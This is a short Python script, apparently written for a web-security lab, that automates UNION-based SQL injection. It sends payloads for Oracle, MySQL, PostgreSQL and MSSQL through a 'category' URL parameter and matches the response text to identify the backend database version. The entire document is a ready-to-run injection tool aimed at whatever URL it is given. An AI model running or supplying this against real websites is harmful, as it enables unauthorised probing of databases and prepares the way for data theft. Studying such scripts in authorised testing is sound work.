import requests

def send_request(url, payload):
    params = {"category": payload}
    try:
        res = requests.get(url, params=params, timeout=5)
        return res.text
    except requests.exceptions.RequestException as e:
        print(f"[에러] 요청 실패: {e}")
        return ""

def run_union(url):
    print("\n[UNION SQL Injection 테스트 시작]\n")

    payloads = [
        # Oracle
        "' UNION SELECT NULL, banner FROM v$version--+",
        
        # MySQL
        "' UNION SELECT version(), NULL#",
        
        # PostgreSQL
        "' UNION SELECT version(), NULL--+",
        
        # MSSQL
        "' UNION SELECT @@version, NULL--+"
    ]

    for payload in payloads:
        print(f"\n[테스트 중 payload]: {payload}")

        res = send_request(url, payload)

        if not res:
            continue

        if "Oracle" in res:
            print("▶ Oracle DB 탐지")
            print(res)
            return

        if "PostgreSQL" in res:
            print("▶ PostgreSQL DB 탐지")
            ##print(res)
            return

        if "Microsoft" in res or "SQL Server" in res:
            print("▶ Microsoft SQL Server 탐지")
            ##print(res)
            return

        if "MariaDB" in res or "MySQL" in res:
            print("▶ MySQL 계열 탐지")
            ##print(res)
            return

    print("\n❌ 버전 정보 탐지 실패")